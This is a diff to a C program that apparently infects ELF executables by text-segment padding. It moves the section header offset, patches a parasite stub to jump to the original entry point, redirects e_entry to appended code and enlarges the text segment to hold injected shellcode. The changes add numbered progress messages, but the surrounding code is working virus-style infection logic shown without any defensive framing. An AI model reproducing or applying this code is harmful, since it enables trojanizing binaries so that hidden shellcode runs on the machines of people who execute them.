@@ -72,17 +72,20 @@ int main(int argc, char * argv[]){
   fprint_all_headers("headers.orig.debug",elf_header,program_headers,section_headers);
 
 	//In ELF header, increase e_shoff by PAGE_SIZE 
+  puts("[01] Increasing e_shoff by PAGE_SIZE in ELF header...");
   printf("header e_shoff changed from %x to ",elf_header->e_shoff);
 	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;
   printf("%x\n",elf_header->e_shoff);
 		
 	//patch code to be inserted to jump to original entry point
 	//from the elf header.		
+  puts("[02] Patching parasite to jump to the original entry point...");
 	parasite = get_parasite();
   printf("writing entry point %x to parasite.\n",elf_header->e_entry);
 	memcpy(&parasite[32],&elf_header->e_entry, 4);	
 	
 	//Locate the text segment program header	
+  puts("[03] Locating the text segment program header...");
   int flag_x = 4;
 	for(int i=0; i < elf_header->e_phnum; i++){
 		if(program_headers[i]->p_type == 1 && program_headers[i]->p_flags & flag_x != 0){
@@ -93,6 +96,7 @@ int main(int argc, char * argv[]){
 	}
 
 	//Modify e_entry, in the elf header, to point to new code.
+  puts("[03][a] Modifying entry point of ELF header to point to new code...");
   printf("elf header entry point changed from %x to ",elf_header->e_entry);
 	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
 	elf_header->e_entry = new_code_address;
@@ -106,14 +110,16 @@ int main(int argc, char * argv[]){
 	int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
 
 	//increase p_filesz to account for new code
+  puts("[03][b] Increasing p_filesz by size of new code...");
   printf("program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
-	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz+shellcode->size+PARASITE_SIZE;
+	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz + shellcode->size + PARASITE_SIZE;
 	program_headers[text_segment_index]->p_filesz = new_p_filesz;
   printf("%x.\n",program_headers[text_segment_index]->p_filesz);
 	
 	//increase p_memsz to account for new code
+  puts("[03][c] Increasing p_memsz by size of new code...");
   printf("program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
-	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz+shellcode->size+PARASITE_SIZE;
+	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz + shellcode->size + PARASITE_SIZE;
 	program_headers[text_segment_index]->p_memsz = new_p_memsz;
 	printf("%x.\n",program_headers[text_segment_index]->p_memsz);
 
